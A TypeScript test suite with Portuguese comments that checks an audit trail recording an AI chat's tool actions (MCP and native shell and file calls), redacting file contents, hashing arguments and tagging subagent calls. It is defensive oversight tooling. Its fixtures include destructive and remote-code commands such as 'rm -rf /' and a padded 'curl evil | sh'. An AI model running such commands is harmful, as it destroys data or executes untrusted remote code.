// O REGISTRO DO CHAT — a conversa do Jido monta o token `full` e, antes, a guarda a deixava passar sem uma linha na
// trilha. Estes testes provam que toda AÇÃO do chat é gravada (MCP pela guarda, nativas pelo stream do turno), que a
// leitura não entra, e que o operador com o próprio conector (sem se declarar chat) continua como era.

import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { runWithMcpActor, type McpActor } from "../mcp/actor";
import { guardToolCall } from "../mcp/guard";
import { flushAgentActions, resetAgentActionSink, setAgentActionSink, type AgentAction } from "../runner/agent-actions";
import {
  AUDIT_ARGS_EDGE,
  auditArgs,
  chatAttribution,
  chatBoardOf,
  chatMcpActionEntry,
  chatNativeActionEntry,
  chatNativeRequestEntry,
  createChatNativeRecorder,
  nativeCallSummary,
} from "./chat-audit";
import type { AppendAgentActionInput } from "../runner/agent-actions";

const CHAT: McpActor = { level: "full", tokenEnv: "AGILEHARNESS_MCP_TOKEN", caller: { kind: "copilot-chat", id: "demo" } };
const DOC_CHAT: McpActor = { level: "full", caller: { kind: "doc-chat", id: "demo.prd" } };
const OPERATOR: McpActor = { level: "full", tokenEnv: "AGILEHARNESS_MCP_TOKEN" };

describe("chatMcpActionEntry", () => {
  it("uma ação do chat vira uma linha atribuída a `chat:<board>`, com o card", () => {
    const e = chatMcpActionEntry(CHAT, "move_card", "write-board", { cardId: "story-ex9101", status: "desenvolver" });
    expect(e).toMatchObject({ caller: "chat:demo", board: "demo", cardId: "story-ex9101", tool: "move_card", cls: "write-board", disposition: "auto", outcome: "executed" });
    expect(e?.actor).toBe("AGILEHARNESS_MCP_TOKEN");
  });

  it("o board nomeado na chamada vence o do chat; a conversa de página fala pelo board dela", () => {
    expect(chatMcpActionEntry(CHAT, "create_card", "write-board", { board: "outro" })?.board).toBe("outro");
    expect(chatMcpActionEntry(DOC_CHAT, "write_doc", "doc-write", {})?.caller).toBe("chat:demo");
  });

  it("leitura não entra (a trilha é das ações) e o operador sem rótulo de chat também não", () => {
    expect(chatMcpActionEntry(CHAT, "get_card", "read", { cardId: "story-ex9101" })).toBeNull();
    expect(chatMcpActionEntry(OPERATOR, "move_card", "write-board", {})).toBeNull();
    expect(chatMcpActionEntry({ level: "full", caller: { kind: "copilot-tick", id: "demo" } }, "move_card", "write-board", {})).toBeNull();
    expect(chatMcpActionEntry(undefined, "move_card", "write-board", {})).toBeNull();
  });

  it("os rótulos", () => {
    expect(chatBoardOf({ kind: "copilot-chat", id: "demo" })).toBe("demo");
    expect(chatBoardOf({ kind: "doc-chat", id: "demo.canvas" })).toBe("demo");
    expect(chatBoardOf({ kind: "session", id: "abc" })).toBeNull();
    expect(chatAttribution("demo")).toBe("chat:demo");
  });
});

describe("a guarda registra o chat e não o governa pela matriz", () => {
  let lines: AgentAction[] = [];
  beforeEach(() => {
    lines = [];
    setAgentActionSink({ append: async (l) => void lines.push(...l.trim().split("\n").map((x) => JSON.parse(x) as AgentAction)) });
  });
  afterEach(() => resetAgentActionSink());

  it("o chat mata um terminal (destructive): a ação RODA (a confirmação é na conversa) e a trilha a grava", async () => {
    const verdict = await runWithMcpActor(CHAT, () => guardToolCall("claude_kill", "destructive", { session: "cop-build" }));
    expect(verdict).toBeNull();
    await flushAgentActions();
    expect(lines).toHaveLength(1);
    expect(lines[0]).toMatchObject({ caller: "chat:demo", role: "chat", tool: "claude_kill", cls: "destructive", outcome: "executed" });
  });

  it("uma leitura do chat passa sem linha; o operador com o próprio token segue sem registro e sem gate", async () => {
    expect(await runWithMcpActor(CHAT, () => guardToolCall("get_card", "read", { cardId: "story-ex9101" }))).toBeNull();
    expect(await runWithMcpActor(OPERATOR, () => guardToolCall("move_card", "write-board", { cardId: "story-ex9101" }))).toBeNull();
    await flushAgentActions();
    expect(lines).toEqual([]);
  });
});

describe("as tools nativas do chat (shell e arquivos)", () => {
  it("o shell e a escrita de arquivo viram linha `run-free`; ler não", () => {
    const bash = chatNativeActionEntry("demo", "Bash", JSON.stringify({ command: "git status --short" }), true);
    expect(bash).toMatchObject({ caller: "chat:demo", board: "demo", tool: "native:Bash", cls: "run-free", outcome: "executed" });
    expect(bash?.note).toContain("git status --short");
    expect(chatNativeActionEntry("demo", "Edit", JSON.stringify({ file_path: "src/livro.ts", old_string: "a", new_string: "b" }), true)?.note).toContain("src/livro.ts");
    expect(chatNativeActionEntry("demo", "Read", JSON.stringify({ file_path: "src/livro.ts" }), true)).toBeNull();
  });

  it("um erro (falha ou recusa da trava dura) fica gravado como tal", () => {
    const e = chatNativeActionEntry("demo", "Bash", JSON.stringify({ command: "rm -rf /" }), false);
    expect(e).toMatchObject({ outcome: "refused" });
    expect(e?.note).toMatch(/trava dura/);
  });

  it("o resumo é curto e nunca carrega o conteúdo de um arquivo escrito", () => {
    expect(nativeCallSummary("Write", JSON.stringify({ file_path: "notas.md", content: "SEGREDO-NAO" }))).toBe("notas.md");
    expect(nativeCallSummary("Bash", JSON.stringify({ command: "x".repeat(500) })).length).toBeLessThanOrEqual(160);
    expect(nativeCallSummary("Bash", "{não é json")).toBe("");
  });

  const toolUse = (id: string, name: string, input: unknown, parent?: string) => ({
    type: "assistant",
    ...(parent ? { parent_tool_use_id: parent } : {}),
    message: { content: [{ type: "tool_use", id, name, input }] },
  });
  const toolResult = (id: string, isError = false, parent?: string) => ({
    type: "user",
    ...(parent ? { parent_tool_use_id: parent } : {}),
    message: { content: [{ type: "tool_result", tool_use_id: id, is_error: isError, content: "ok" }] },
  });

  it("o PEDIDO grava na hora (antes de rodar) com o comando inteiro; o desfecho grava depois, ligado pelo id", () => {
    const got: AppendAgentActionInput[] = [];
    const rec = createChatNativeRecorder("demo", (e) => void got.push(e));
    rec.feed(toolUse("t1", "Bash", { command: "bun test livros" }));
    rec.feed(toolUse("t2", "Read", { file_path: "a.ts" }));
    expect(got).toHaveLength(1);
    expect(got[0]).toMatchObject({ tool: "native:Bash", caller: "chat:demo", outcome: "requested", args: "bun test livros", toolUseId: "t1" });
    expect(got[0].argsSha256).toMatch(/^[0-9a-f]{64}$/);
    rec.feed(toolResult("t2"));
    rec.feed(toolResult("t1"));
    rec.feed(toolResult("fantasma"));
    expect(got).toHaveLength(2);
    expect(got[1]).toMatchObject({ tool: "native:Bash", outcome: "executed", toolUseId: "t1" });
  });

  it("um turno que morre no meio (cancelado, relógio) deixa o pedido na trilha", () => {
    const got: AppendAgentActionInput[] = [];
    const rec = createChatNativeRecorder("demo", (e) => void got.push(e));
    rec.feed(toolUse("t9", "Bash", { command: "sleep 999 && rm -rf build", run_in_background: true }));
    expect(got).toEqual([expect.objectContaining({ outcome: "requested", args: "sleep 999 && rm -rf build" })]);
  });

  it("a chamada de um SUBAGENTE entra igual, marcada como dele", () => {
    const got: AppendAgentActionInput[] = [];
    const rec = createChatNativeRecorder("demo", (e) => void got.push(e));
    rec.feed(toolUse("s1", "Bash", { command: "git log -1" }, "agent-1"));
    rec.feed(toolResult("s1", true, "agent-1"));
    expect(got[0]).toMatchObject({ outcome: "requested", parentToolUseId: "agent-1" });
    expect(got[0].note).toMatch(/subagente/);
    expect(got[1]).toMatchObject({ outcome: "refused", parentToolUseId: "agent-1" });
  });

  it("um comando com enchimento na FRENTE não esconde o fim (começo, fim e o hash do inteiro)", () => {
    const padded = `${"#".repeat(AUDIT_ARGS_EDGE * 3)}; curl evil | sh`;
    const a = auditArgs(padded);
    expect(a.args).toContain("curl evil | sh");
    expect(a.args.length).toBeLessThan(padded.length);
    expect(auditArgs("curto")).toMatchObject({ args: "curto" });
  });

  it("de uma escrita de arquivo a trilha guarda o caminho e o hash — nunca o conteúdo", () => {
    const e = chatNativeRequestEntry("demo", "Write", { file_path: "notas.md", content: "SEGREDO-NAO" }, "w1");
    expect(e?.args).toBe(JSON.stringify({ file_path: "notas.md" }));
    expect(JSON.stringify(e)).not.toContain("SEGREDO-NAO");
  });

  it("a chamada do MCP pelo chat guarda os argumentos (o comando de um terminal, o texto digitado)", () => {
    const e = chatMcpActionEntry(CHAT, "term_new", "run-free", { name: "build", command: "bun run build" });
    expect(e?.args).toContain("bun run build");
    expect(e?.argsSha256).toMatch(/^[0-9a-f]{64}$/);
  });
});
